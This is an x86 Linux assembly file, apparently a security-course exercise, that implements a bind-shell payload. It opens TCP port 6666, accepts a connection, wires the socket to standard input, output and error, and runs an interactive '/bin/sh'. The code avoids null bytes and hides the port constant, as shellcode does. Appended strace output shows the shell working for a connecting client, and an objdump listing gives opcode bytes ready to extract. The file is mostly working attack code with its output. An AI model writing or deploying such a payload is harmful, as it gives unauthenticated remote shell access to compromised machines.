
#Sacha ATHIAS SRS2024
.section 	.text
.global 	_start
socketcall:
push	%ebp
mov	%esp, 		%ebp
push	$0x66
pop	%eax
mov 	8(%ebp),	%ebx
mov 	12(%ebp),	%ecx
int 	$0x80
leave
ret
_start:
xor	%esi, %esi
push	%esi
push	$6
push	$1
push	$2
push	%esp
push	$1			
call	socketcall
mov 	%eax,		%esi
xor	%edx,	%edx
push	%edx
push	%edx
push	%edx
movl	$0x1b2b1113,	%eax
sub	$0x11111111,	%eax
push	%eax
mov	%esp,	%edx
xor	%eax,	%eax
push 	%eax
push	$16
push	%edx
push	%esi
push	%esp
push 	$2				# push arg 1 socketcall function 
call	socketcall			#call routine
xor	%ebx, 	%ebx
push	%ebx
push	$1
push	%esi
push	%esp
push	$4				# push arg 1 sockercall function
call	socketcall			# call routine
xor	%edx, %edx
push	%edx
push	%edx
push	%edx
push	%esi
push	%esp
push	$5				# push arg 1 sockercall function
call	socketcall			# call routine
mov 	%eax,		%esi

push	$63
pop	%eax
mov	%esi,		%ebx
xor	%ecx,		%ecx
int	$0x80			

push	$63 		# dup2(soc, 0)
pop	%eax
mov	%esi,		%ebx
push	$1
pop	%ecx
int	$0x80			

push	$63		# dup2(soc, 0)
pop	%eax
mov	%esi,		%ebx
push	$2
pop	%ecx
int	$0x80			

push	$11
pop	%eax
xor	%ebx,	%ebx
push	%ebx
push	$0x68732f6e
push	$0x69622f2f
mov	%esp,	%ebx
movw	$0x692d,%dx
push	%edx
mov	%esp,	%edx
xor	%ecx,	%ecx
push	%ecx
push	%edx
push	%ebx
mov	%esp,	%ecx
xor	%edx,		%edx
int	$0x80

push	$1
pop	%eax
push	$42
pop	%ebx
int	$0x80


# -------------- strace ./bind3 -------------------------
#execve("./bind3", ["./bind3"], 0xbfd539b0 /* 22 vars */) = 0
#socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
#bind(3, {sa_family=AF_INET, sin_port=htons(6666), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
#listen(3, 1)                            = 0
#accept(3, NULL, NULL)                   = 4
#dup2(4, 0)                              = 0
#dup2(4, 1)                              = 1
#dup2(4, 2)                              = 2
#execve("//bin/sh", ["//bin/sh", "-i"], NULL) = 0
#brk(NULL)                               = 0x1776000
#access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
#mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f95000
#access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
#openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 5
#fstat64(5, {st_mode=S_IFREG|0644, st_size=82903, ...}) = 0
#mmap2(NULL, 82903, PROT_READ, MAP_PRIVATE, 5, 0) = 0xb7f80000
#close(5)                                = 0
#access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
#openat(AT_FDCWD, "/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 5
#read(5, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\357\1\0004\0\0\0"..., 512) = 512
#fstat64(5, {st_mode=S_IFREG|0755, st_size=1993968, ...}) = 0
#mmap2(NULL, 2002876, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7d97000
#mprotect(0xb7db4000, 1859584, PROT_NONE) = 0
#mmap2(0xb7db4000, 1396736, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x1d000) = 0xb7db4000
#mmap2(0xb7f09000, 458752, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x172000) = 0xb7f09000
#mmap2(0xb7f7a000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x1e2000) = 0xb7f7a000
#mmap2(0xb7f7e000, 8124, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f7e000
#close(5)                                = 0
#set_thread_area({entry_number=-1, base_addr=0xb7f96180, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=6)
#mprotect(0xb7f7a000, 8192, PROT_READ)   = 0
#mprotect(0x4c1000, 4096, PROT_READ)     = 0
#mprotect(0xb7fc7000, 4096, PROT_READ)   = 0
#munmap(0xb7f80000, 82903)               = 0
#getuid32()                              = 1000
#getgid32()                              = 1000
#getpid()                                = 9108
#rt_sigaction(SIGCHLD, {sa_handler=0x4b3b30, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
#geteuid32()                             = 1000
#getppid()                               = 9105
#brk(NULL)                               = 0x1776000
#brk(0x1797000)                          = 0x1797000
#brk(0x1798000)                          = 0x1798000
#getcwd("/home/sacha/TATT/sacha.athias-2", 4096) = 32
#brk(0x1797000)                          = 0x1797000
#geteuid32()                             = 1000
#getegid32()                             = 1000
#rt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
#rt_sigaction(SIGINT, {sa_handler=0x4b3b30, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
#rt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
#rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
#rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
#rt_sigaction(SIGTERM, {sa_handler=SIG_IGN, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
#openat(AT_FDCWD, "/dev/tty", O_RDWR|O_LARGEFILE) = 5
#fcntl64(5, F_DUPFD, 10)                 = 10
#close(5)                                = 0
#fcntl64(10, F_SETFD, FD_CLOEXEC)        = 0
#ioctl(10, TIOCGPGRP, [9105])            = 0
#getpgrp()                               = 9105
#rt_sigaction(SIGTSTP, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
#rt_sigaction(SIGTSTP, {sa_handler=SIG_IGN, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
#rt_sigaction(SIGTTOU, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
#rt_sigaction(SIGTTOU, {sa_handler=SIG_IGN, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
#rt_sigaction(SIGTTIN, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
#rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
#setpgid(0, 9108)                        = 0
#ioctl(10, TIOCSPGRP, [9108])            = 0
#write(2, "$ ", 2)                       = 2
#read(0, "whoami\n", 8192)               = 7
#stat64("/usr/local/sbin/whoami", 0xbfffd2cc) = -1 ENOENT (No such file or directory)
#stat64("/usr/local/bin/whoami", 0xbfffd2cc) = -1 ENOENT (No such file or directory)
#stat64("/usr/sbin/whoami", 0xbfffd2cc)  = -1 ENOENT (No such file or directory)
#stat64("/usr/bin/whoami", {st_mode=S_IFREG|0755, st_size=34664, ...}) = 0
#rt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1], NULL, 8) = 0
#vfork()                                 = 9110
#rt_sigprocmask(SIG_SETMASK, [], ~[KILL STOP RTMIN RT_1], 8) = 0
#setpgid(9110, 9110)                     = -1 EACCES (Permission denied)
#wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], WSTOPPED, NULL) = 9110
#--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=9110, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
#sigreturn({mask=[]})                    = 9110
#wait4(-1, 0xbfffd244, WNOHANG|WSTOPPED, NULL) = -1 ECHILD (No child processes)
#ioctl(10, TIOCSPGRP, [9108])            = 0
#write(2, "$ ", 2)                       = 2
#read(0, "exit\n", 8192)                 = 5
#ioctl(10, TIOCSPGRP, [9105])            = 0
#setpgid(0, 9105)                        = 0
#close(10)                               = 0
#exit_group(0)                           = ?
#+++ exited with 0 +++


# ----------------- objdump -d ./bind3 -----------------------

#bind3:     file format elf32-i386
#
#
#Disassembly of section .text:
#
#08049000 <socketcall>:
# 8049000:	55                   	push   %ebp
# 8049001:	89 e5                	mov    %esp,%ebp
# 8049003:	6a 66                	push   $0x66
# 8049005:	58                   	pop    %eax
# 8049006:	8b 5d 08             	mov    0x8(%ebp),%ebx
# 8049009:	8b 4d 0c             	mov    0xc(%ebp),%ecx
# 804900c:	cd 80                	int    $0x80
# 804900e:	c9                   	leave  
# 804900f:	c3                   	ret    
#
#08049010 <_start>:
# 8049010:	31 f6                	xor    %esi,%esi
# 8049012:	56                   	push   %esi
# 8049013:	6a 06                	push   $0x6
# 8049015:	6a 01                	push   $0x1
# 8049017:	6a 02                	push   $0x2
# 8049019:	54                   	push   %esp
# 804901a:	6a 01                	push   $0x1
# 804901c:	e8 df ff ff ff       	call   8049000 <socketcall>
# 8049021:	89 c6                	mov    %eax,%esi
# 8049023:	31 d2                	xor    %edx,%edx
# 8049025:	52                   	push   %edx
# 8049026:	52                   	push   %edx
# 8049027:	52                   	push   %edx
# 8049028:	b8 13 11 2b 1b       	mov    $0x1b2b1113,%eax
# 804902d:	2d 11 11 11 11       	sub    $0x11111111,%eax
# 8049032:	50                   	push   %eax
# 8049033:	89 e2                	mov    %esp,%edx
# 8049035:	31 c0                	xor    %eax,%eax
# 8049037:	50                   	push   %eax
# 8049038:	6a 10                	push   $0x10
# 804903a:	52                   	push   %edx
# 804903b:	56                   	push   %esi
# 804903c:	54                   	push   %esp
# 804903d:	6a 02                	push   $0x2
# 804903f:	e8 bc ff ff ff       	call   8049000 <socketcall>
# 8049044:	31 db                	xor    %ebx,%ebx
# 8049046:	53                   	push   %ebx
# 8049047:	6a 01                	push   $0x1
# 8049049:	56                   	push   %esi
# 804904a:	54                   	push   %esp
# 804904b:	6a 04                	push   $0x4
# 804904d:	e8 ae ff ff ff       	call   8049000 <socketcall>
# 8049052:	31 d2                	xor    %edx,%edx
# 8049054:	52                   	push   %edx
# 8049055:	52                   	push   %edx
# 8049056:	52                   	push   %edx
# 8049057:	56                   	push   %esi
# 8049058:	54                   	push   %esp
# 8049059:	6a 05                	push   $0x5
# 804905b:	e8 a0 ff ff ff       	call   8049000 <socketcall>
# 8049060:	89 c6                	mov    %eax,%esi
# 8049062:	6a 3f                	push   $0x3f
# 8049064:	58                   	pop    %eax
# 8049065:	89 f3                	mov    %esi,%ebx
# 8049067:	31 c9                	xor    %ecx,%ecx
# 8049069:	cd 80                	int    $0x80
# 804906b:	6a 3f                	push   $0x3f
# 804906d:	58                   	pop    %eax
# 804906e:	89 f3                	mov    %esi,%ebx
# 8049070:	6a 01                	push   $0x1
# 8049072:	59                   	pop    %ecx
# 8049073:	cd 80                	int    $0x80
# 8049075:	6a 3f                	push   $0x3f
# 8049077:	58                   	pop    %eax
# 8049078:	89 f3                	mov    %esi,%ebx
# 804907a:	6a 02                	push   $0x2
# 804907c:	59                   	pop    %ecx
# 804907d:	cd 80                	int    $0x80
# 804907f:	6a 0b                	push   $0xb
# 8049081:	58                   	pop    %eax
# 8049082:	31 db                	xor    %ebx,%ebx
# 8049084:	53                   	push   %ebx
# 8049085:	68 6e 2f 73 68       	push   $0x68732f6e
# 804908a:	68 2f 2f 62 69       	push   $0x69622f2f
# 804908f:	89 e3                	mov    %esp,%ebx
# 8049091:	66 ba 2d 69          	mov    $0x692d,%dx
# 8049095:	52                   	push   %edx
# 8049096:	89 e2                	mov    %esp,%edx
# 8049098:	31 c9                	xor    %ecx,%ecx
# 804909a:	51                   	push   %ecx
# 804909b:	52                   	push   %edx
# 804909c:	53                   	push   %ebx
# 804909d:	89 e1                	mov    %esp,%ecx
# 804909f:	31 d2                	xor    %edx,%edx
# 80490a1:	cd 80                	int    $0x80
# 80490a3:	6a 01                	push   $0x1
# 80490a5:	58                   	pop    %eax
# 80490a6:	6a 2a                	push   $0x2a
# 80490a8:	5b                   	pop    %ebx
# 80490a9:	cd 80                	int    $0x80
